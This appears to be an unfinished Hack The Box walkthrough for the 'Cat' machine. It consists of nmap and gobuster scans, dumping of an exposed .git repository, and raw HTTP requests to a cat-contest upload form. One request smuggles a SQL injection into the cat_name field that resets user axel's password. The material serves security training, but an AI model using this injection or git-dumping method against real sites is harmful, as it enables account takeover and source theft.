# cat.htb
https://app.hackthebox.com/machines/Cat

```
sudo nmap -sC -sV -p- -T5 --max-rate 10000 10.10.11.53

Hexada@hexada ~/Downloads$ sudo nmap -sC -sV -p- -T5 --max-rate 10000 10.10.11.53                                                                                                     1 ↵  
[sudo] password for Hexada: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 10:54 EEST
Warning: 10.10.11.53 giving up on port because retransmission cap hit (2).
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.20s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Best Cat Competition
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 349.36 seconds
```

```
Hexada@hexada ~/Downloads$ gobuster dir -u http://cat.htb -w ~/app/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt                                       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cat.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/Hexada/app/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 300] [--> http://cat.htb/img/]
/uploads              (Status: 301) [Size: 304] [--> http://cat.htb/uploads/]
/css                  (Status: 301) [Size: 300] [--> http://cat.htb/css/]
/winners              (Status: 301) [Size: 304] [--> http://cat.htb/winners/]
/server-status        (Status: 403) [Size: 272]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

```
POST /contest.php HTTP/1.1
Host: cat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundarybd5374079d18108187245d6c7c59c63e
Content-Length: 697
Origin: http://cat.htb
Connection: keep-alive
Referer: http://cat.htb/contest.php
Cookie: PHPSESSID=9qr30345sfdv0qmc304igt0dke
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

------geckoformboundarybd5374079d18108187245d6c7c59c63e
Content-Disposition: form-data; name="cat_name"

Cotino
------geckoformboundarybd5374079d18108187245d6c7c59c63e
Content-Disposition: form-data; name="age"

1717
------geckoformboundarybd5374079d18108187245d6c7c59c63e
Content-Disposition: form-data; name="birthdate"

2025-04-09
------geckoformboundarybd5374079d18108187245d6c7c59c63e
Content-Disposition: form-data; name="weight"

0.04
------geckoformboundarybd5374079d18108187245d6c7c59c63e
Content-Disposition: form-data; name="cat_photo"; filename="shell"
Content-Type: application/octet-stream

hello world
------geckoformboundarybd5374079d18108187245d6c7c59c63e--
```

```
Hexada@hexada ~/Downloads$ gobuster dir -u http://cat.htb/.git -w ~/app/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt                                  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cat.htb/.git
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/Hexada/app/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 1726]
/info                 (Status: 301) [Size: 306] [--> http://cat.htb/.git/info/]
/config               (Status: 200) [Size: 92]
/logs                 (Status: 301) [Size: 306] [--> http://cat.htb/.git/logs/]
/objects              (Status: 301) [Size: 309] [--> http://cat.htb/.git/objects/]
/description          (Status: 200) [Size: 73]
/branches             (Status: 301) [Size: 310] [--> http://cat.htb/.git/branches/]
/refs                 (Status: 301) [Size: 306] [--> http://cat.htb/.git/refs/]
/HEAD                 (Status: 200) [Size: 23]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

```
Hexada@hexada ~/Downloads$ curl http://cat.htb/.git//HEAD                                                                                                                                  
ref: refs/heads/master
Hexada@hexada ~/Downloads$ curl http://cat.htb/.git/refs/heads/master                                                                                                                      
8c2c2701eb4e3c9a42162cfb7b681b6166287fd5
```

`.git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy`

```
Hexada@hexada ~/app/vrm/cat.htb$ curl http://cat.htb/.git/objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5 --output 8c2c27_object                                                    8 ↵  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   121  100   121    0     0    810      0 --:--:-- --:--:-- --:--:--   812
Hexada@hexada ~/app/vrm/cat.htb$ ls                                             
```

```
Hexada@hexada ~/app/vrm/cat.htb$ cat 8c2c27_object | zlib-flate -uncompress                                                                                                                
commit 157tree c9e281ffb3f5431800332021326ba5e97aeb2764
author Axel <axel2017@gmail.com> 1725146774 +0000
committer Axel <axel2017@gmail.com> 1725146774 +0000

Cat v1
```

```
(myenv) Hexada@hexada ~/app/pentesting-tools/GitHacker$ githacker --url http://cat.htb/.git/ --output-folder /home/Hexada/app/vrm/cat.htb/git                                   2 ↵ master 
2025-04-27 10:15:42 INFO 1 urls to be exploited
2025-04-27 10:15:42 INFO Exploiting http://cat.htb/.git/ into /home/Hexada/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d
2025-04-27 10:15:43 INFO Downloading basic files...
```

```
(myenv) Hexada@hexada ~/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d$ ls                                                                                                    master 
accept_cat.php  admin.php  config.php  contest.php  css  delete_cat.php  img  img_winners  index.php  join.php  logout.php  view_cat.php  vote.php  winners  winners.php
```

```
POST /contest.php HTTP/1.1
Host: cat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundaryc829c27325392992f2c573d9c72e68f0
Content-Length: 195434
Origin: http://cat.htb
Connection: keep-alive
Referer: http://cat.htb/contest.php
Cookie: PHPSESSID=t72mu0fmaf5pkkcu9rna7c9r3l
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

------geckoformboundaryc829c27325392992f2c573d9c72e68f0
Content-Disposition: form-data; name="cat_name"

%27%29%3B%20UPDATE%20users%20SET%20password%3D%271234%27%20WHERE%20username%3D%27axel%27--
------geckoformboundaryc829c27325392992f2c573d9c72e68f0
Content-Disposition: form-data; name="age"

123
------geckoformboundaryc829c27325392992f2c573d9c72e68f0
Content-Disposition: form-data; name="birthdate"

2025-04-23
------geckoformboundaryc829c27325392992f2c573d9c72e68f0
Content-Disposition: form-data; name="weight"

123
------geckoformboundaryc829c27325392992f2c573d9c72e68f0
Content-Disposition: form-data; name="cat_photo"; filename="f7a5cdbc7208b21a02c0c4e19011956d.jpg"
Content-Type: image/jpeg

------geckoformboundaryc829c27325392992f2c573d9c72e68f0--
```

```
HTTP/1.1 200 OK
Date: Mon, 28 Apr 2025 18:18:38 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2391
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8



<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Contest - Best Cat Community</title>
<link rel="stylesheet" href="css/styles.css">
<style>
    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    form {
        padding: 20px;
        box-sizing: border-box;
    }
    label,
    input {
        display: block;
        margin-bottom: 10px;
        width: 100%;
    }
    input[type="submit"] {
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 15px 20px;
        cursor: pointer;
        transition: background-color 0.3s;
        width: 100%;
    }
    input[type="submit"]:hover {
        background-color: #0056b3;
    }
    .message {
        margin-top: 20px;
        text-align: center;
        color: green;
    }
    .error-message {
        margin-top: 20px;
        text-align: center;
        color: red;
    }
</style>
</head>
<body>

    <div class="navbar">
        <a href="/">Home</a>
        <a href="/vote.php">Vote</a>
        <a href="/contest.php">Contest</a>
        <a href="/winners.php">Winners</a>
        <a href="/logout.php">Logout</a>    </div>

    <div class="container">
        <h1>Contest - Best Cat Community</h1>
                    <div class="message">Cat has been successfully sent for inspection.</div>
                        <form method="post" enctype="multipart/form-data">
            <label for="cat_name">Cat Name:</label>
            <input type="text" id="cat_name" name="cat_name" required>
            <label for="age">Cat Age:</label>
            <input type="number" id="age" name="age" required>
            <label for="birthdate">Cat Birthdate:</label>
            <input type="date" id="birthdate" name="birthdate" required>
            <label for="weight">Cat Weight (in kg):</label>
            <input type="number" id="weight" name="weight" step="0.01" required>
            <label for="cat_photo">Cat Photo:</label>
            <input type="file" id="cat_photo" name="cat_photo" accept="image/*" required>
            <input type="submit" value="Register Cat">
        </form>
    </div>

</body>
</html>
```

```
HTTP/1.1 200 OK
Date: Mon, 28 Apr 2025 18:30:57 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 4081
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8




<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Join the Best Cat Community</title>
<link rel="stylesheet" href="css/styles.css">
<style>
    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .card {
        overflow: hidden;
        transition: height 0.3s ease-in-out;
        border: 1px solid #ccc;
        border-radius: 5px;
        margin-bottom: 40px; /* Increased margin between cards */
    }
    .card.register {
        height: 400px;
    }
    .card.login {
        height: 400px;
    }
    form {
        padding: 20px;
        box-sizing: border-box;
    }
    label,
    input {
        display: block;
        margin-bottom: 10px;
        width: 100%; /* Make inputs fill the width */
    }
    input[type="submit"] {
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 15px 20px;
        cursor: pointer;
        transition: background-color 0.3s;
        width: 100%; /* Make button fill the width */
    }
    input[type="submit"]:hover {
        background-color: #0056b3;
    }
    .toggle-link {
        text-align: center;
        margin-bottom: 20px;
    }
    .toggle-link a {
        text-decoration: none;
        color: #007bff;
        transition: color 0.3s;
    }
    .toggle-link a:hover {
        color: #0056b3;
    }
    .message {
        margin-top: 20px;
        text-align: center;
        color: green;
    }
    .error-message {
        margin-top: 20px;
        text-align: center;
        color: red;
    }
</style>
</head>
<body>

<div class="navbar">
    <a href="/">Home</a>
    <a href="/vote.php">Vote</a>
    <a href="/contest.php">Contest</a>
    <a href="/winners.php">Winners</a>
    <a href="/join.php">Join</a>
</div>

<div class="container">
    <h1>Join the Best Cat Community</h1>
                <div class="error-message">Incorrect username or password.</div>
        <div class="card register">
        <center><h2>Register</h2></center>
        <form id="registerForm" method="get">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <input type="submit" name="registerForm" value="Register">
        </form>
    </div>
    <div class="card login" style="display: none;">
        <center><h2>Login</h2></center>
        <form id="loginForm" method="get">
            <label for="loginUsername">Username:</label>
            <input type="text" id="loginUsername" name="loginUsername" required>
            <label for="loginPassword">Password:</label>
            <input type="password" id="loginPassword" name="loginPassword" required>
            <input type="submit" name="loginForm" value="Login">
        </form>
    </div>
    <div class="toggle-link">
        <a href="#" id="toggleForm">Already have an account?</a>
    </div>
</div>

<script>
    var toggleLink = document.getElementById("toggleForm");
    var registerForm = document.querySelector(".register");
    var loginForm = document.querySelector(".login");

    toggleLink.addEventListener("click", function(event) {
        event.preventDefault();
        if (registerForm.style.display === "block") {
            registerForm.style.display = "none";
            loginForm.style.display = "block";
            toggleLink.textContent = "Register"; // Changed text
        } else {
            registerForm.style.display = "block";
            loginForm.style.display = "none";
            toggleLink.textContent = "Already have an account?"; // Changed text
        }
    });
</script>

</body>
</html>
```





                                                                                                
